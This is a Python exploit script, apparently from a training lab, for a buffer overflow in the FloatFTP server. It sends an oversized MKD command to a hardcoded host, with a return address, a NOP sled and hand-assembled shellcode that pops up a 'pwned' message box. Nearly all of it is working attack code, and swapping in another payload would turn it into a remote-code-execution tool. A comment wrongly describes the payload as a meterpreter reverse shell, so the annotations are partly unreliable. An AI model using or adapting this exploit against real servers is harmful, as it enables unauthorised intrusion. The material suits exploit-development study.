#Created by: Uday Mittal (Yaksas CSC)

#This code exploits the buffer overflow vulnerability in FloatFTP. It uses a custom shellcode that launches a Message box with the caption "Message from Yaksas CSC Lab:" and text "This system is now pwned by Yaksas CSC Lab!".

#Refer: https://www.fuzzysecurity.com/tutorials/expDev/6.html

#arwin - win32 address resolution program - by steve hanna - v.01 MessageBoxA is located at 0x7e4507ea in user32.dll

# XOR EAX, EAX - \x33\xC0
# PUSH EAX - \x50
# PUSH "ab! " - \x68\x61\x62\x21\x20
# PUSH "SC L" - \x68\x53\x43\x20\x4c
# PUSH "as C" - \x68\x61\x73\x20\x43
# PUSH "Yaks" - \x68\x59\x61\x6b\x73
# PUSH " by " - \x68\x20\x62\x79\x20 
# PUSH "wned" - \x68\x77\x6e\x65\x64
# PUSH "ow p" - \x68\x6f\x77\x20\x70
# PUSH "is n" - \x68\x69\x6e\x20\x6e
# PUSH "tem " - \x68\x74\x65\x6d\x20
# PUSH " sys" - \x68\x20\x73\x79\x73
# PUSH "This" - \x68\x54\x68\x69\x73
# MOV ECX, ESP - \x8B\xCC
# PUSH EAX - \x50
# PUSH "Lab:" - \x68\x4c\x61\x62\x3a
# PUSH "CSC " - \x68\x43\x53\x43\x20
# PUSH "sas " - \x68\x73\x61\x73\x20
# PUSH " Yak" - \x68\x20\x59\x61\x6b
# PUSH "from" - \x68\x66\x72\x6f\x6d
# PUSH "age " - \x68\x61\x67\x65\x20
# PUSH "Mess" - \x68\x4d\x65\x73\x73
# MOV EDX, ESP - \x8B\xD4
# PUSH EAX - \x50
# PUSH ECX - \x51
# PUSH EDX - \x52
# PUSH EAX - \x50
# MOV ESI, 7e4507ea - \xBE\xEA\x07\x45\x7E
# CALL ESI - \xFF\xD6
import socket
import sys

#Shellcode payload: windows/meterpreter/reverse_tcp LHOST=192.168.43.28 LPORT=4444 Bad characters = '\x00\x0A\x0D'

buf =  "\x33\xC0\x50\x68\x61\x62\x21\x20\x68\x53\x43\x20\x4c\x68\x61\x73\x20\x43\x68\x59\x61\x6b\x73\x68\x20\x62\x79\x20\x68\x77\x6e\x65\x64\x68\x6f\x77\x20\x70\x68\x69\x6e\x20\x6e\x68\x74\x65\x6d\x20\x68\x20\x73\x79\x73\x68\x54\x68\x69\x73\x8B\xCC\x50\x68\x4c\x61\x62\x3a\x68\x43\x53\x43\x20\x68\x73\x61\x73\x20\x68\x20\x59\x61\x6b\x68\x66\x72\x6f\x6d\x68\x61\x67\x65\x20\x68\x4d\x65\x73\x73\x8B\xD4\x50\x52\x51\x50\xBE\xEA\x07\x45\x7E\xFF\xD6"

nop = "\x90"*20

evil = "A"*247 + "\x59\x54\xC3\x77" + nop + buf + "\x90" * (1000-247-20-len(buf))
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.43.72',21))

s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD '+evil+'\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close
